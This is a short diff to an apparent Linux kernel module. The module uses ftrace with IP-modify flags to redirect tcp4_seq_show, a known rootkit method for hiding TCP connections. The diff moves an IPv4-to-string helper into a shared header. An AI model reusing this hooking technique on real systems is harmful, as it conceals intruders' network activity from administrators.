@@ -3,6 +3,7 @@
 #include <linux/slab.h>
 #include <linux/ftrace.h>
 #include <net/inet_sock.h>
+#include "../common/stringify/to_string.h"
 
 // Function prototype.
 void callback_func(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct pt_regs *regs);
@@ -18,18 +19,6 @@ typedef int (*original_tcp4_seq_show_t)(struct seq_file *seq, void *v);
 static unsigned long tcp4_seq_show_address; 
 static original_tcp4_seq_show_t original_tcp4_seq_ptr;
 static struct ftrace_ops ops = { .func = callback_func, .flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY };
-static const int IP_STRING_MAX_LEN = 15;
-
-void ipaddr_to_string(__be32 ipaddr, char* ipaddr_string)
-{
-    int first = (unsigned char)(ipaddr & 0xFF);
-    int second = (unsigned char)((ipaddr >> 8) & 0xFF);
-    int third = (unsigned char)((ipaddr >> 16) & 0xFF);
-    int fourth = (unsigned char)((ipaddr >> 24) & 0xFF);
-
-    // Maximum length of an ip string in ipv4
-    sprintf(ipaddr_string, "%d.%d.%d.%d", first, second, third, fourth);
-}
 
 int new_tcp4_seq_show(struct seq_file *seq, void *v) {
     if (v == SEQ_START_TOKEN) {
